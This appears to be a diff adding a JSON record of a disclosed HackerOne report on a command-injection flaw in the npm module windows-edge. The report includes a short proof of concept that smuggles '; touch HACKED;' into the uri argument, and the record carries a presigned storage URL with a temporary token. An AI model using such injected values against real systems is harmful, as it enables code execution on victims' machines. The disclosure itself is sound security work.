@@ -1,0 +1,126 @@
+{
+  "id": 878420,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Nzg0MjA=",
+  "url": "https://hackerone.com/reports/878420",
+  "title": "[windows-edge] RCE via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-19T22:34:12.863Z",
+  "submitted_at": "2020-05-19T22:34:12.863Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mik317",
+    "url": "/mik317",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-24T22:04:31.879Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-07-25T22:04:26.521Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `RCE` issue in the `windows-edge` module.\nIt allows to execute `arbitrary commands remotely inside the victim's PC`\n\n# Module\n**module name:** `windows-edge`\n**version:** `1.0.1`\n**npm page:** `https://www.npmjs.com/package/windows-edge`\n\n## Module Description\n> Launch a new Microsoft Edge tab on Windows\n\n## Module Stats\n[102] downloads in the last week\n\n## Vulnerability Description\nThe issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/eugeneware/windows-edge/blob/master/index.js#L8\n\n## Steps To Reproduce:\n1. Create the following PoC file:\n\n```js\n// poc.js\nconst edge = require('windows-edge');\nedge({ uri: 'https://github.com/; touch HACKED; #' }, (err, ps) => {})\n\n```\n1. Check there aren't files called `HACKED` \n1. Execute the following commands in another terminal:\n\n```bash\nnpm i windows-edge # Install affected module\nnode poc.js #  Run the PoC\n```\n1. Recheck the files: now `HACKED` has been created :) {F835199}\n\n## Patch\n> Don't format `commands` using insecure `user's inputs` :)\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: v12.16.1\n- [NPM VERSION]: 6.13.4\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\n`RCE` via command formatting on `windows-edge`",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 835199,
+      "file_name": "Screenshot_from_2020-05-20_00-27-21.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Zaan8EJv714fXx1zfoYPy6Yg?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-05-20_00-27-21.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-05-20_00-27-21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVNV4E25D%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152854Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIE960VllZtNC%2FbUPA0vV%2FxLVgvvK71RIGviKisKlxfVtAiBr0qGGKK6SWddIJhbbA9j4qbsXWcMBgOHpuLgrg%2FW2Hyq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMqb1%2BrAXzixLF%2BjnvKo8F76IyRZgBGCRdHV1hMUR0jT3xf1xlLq%2Bqx1%2BorvjV6eTVieENOmrgUaUrinJIYPLWg2YZUW%2B5l8a38y%2FEZcGzcqYuSE%2BI4QLJFyns2org4rDi0OYXY4bffY1nBT2wKcb6OHfMEn4Bvtv9RuyNeSvGPwt2Gbc4d2n8og9ytXeXESQ5Mjlhng8ZAUeY5DNRhZxXVDA0cVvk2SMa6HKesuby%2FpYqWjPsPIJPniLE6T9MaJuIgyp6z5AzhESyvHtKB9yVOTfpT5Mv3uErEVYDWHDHePLArcvChHf6AynHQorHldA1lcKWBwipmOmvAILOREawkibTIZrrTLLV%2BkcT6cy98OILJ4R4sAVmV3ZAN3Gp9IPBCReeJRcZddalv%2F7h9x%2BPWN6lm%2BOTnvV0crwvhL%2FjHeoQViPPcVSnUUWQ1GeTveb4gY%2BNLKZ8RdClQBwvugU3d1smsDzAs0qgr523sptcl0LNzc07CjyMVEDPzy3fu%2FH0GqpiM3%2B4cgQWgTipFSaHK9tMkaff3wlMZfo41kbd1JwLWCQYRLXcslzmKOq2lPSSOZml2x84pzFAqvNVPuF%2BKd7Thj33i2Vheshkv82bmHCV7IZbQO%2FwrPS8q3gAIkMkr60p1VLvGWaOkmxnwqBrdudoP3VqAirVW1Di%2FtjtueplXj0QV3oqLUpX4iPqgzwOq8UIRmyg%2FD4vUZlrVj%2BrBNUzzZVbo3ryjuLd0nfm50s2vSYwffmsQFgTBMcrch3RiNwzgfJ6%2FZYok9HRM%2F4avHOWbRfu4w2UUEJR8pMqNiuegCco0W1fcSh5MPzPm%2FTKFrlrZu%2BbrR6WTMIa9bLwEOS2KpqsWUdQcScGNA9LyN1bN3Ee%2Feufc%2FEgxorsljCfjv3PBjqyAZfYEPjougdmjiACVMNjwoba5DF0McHETZHiK3QwZYUKAaHfv9fvOjaowSD5nGhz%2BIa9jJMsfjotcGV4vqGge%2BC%2FlWdaHZPTF98TAD7fL7mIhKoOTncumT0G3dat6%2B%2BAq82gTgRhrUytPJfIfzXRGxrdUNdYQ1U%2Bu1IkaxsFTi2eNxOLCNQUrnmb43%2ByGo8Cira8h6aRRo%2FgvoBf%2BjEisaDt3OdtNhDd4%2F7uMhwIvEhTfgg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=439e00a7f2b6e3c755ccf446774dac115f590a74fe0f25677f92b55d7448957f",
+      "file_size": 232236,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-24T22:04:26.625Z",
+  "allow_singular_disclosure_after": -180033868.25376678,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "poneglyph",
+    "bl4de",
+    "jesuser14"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
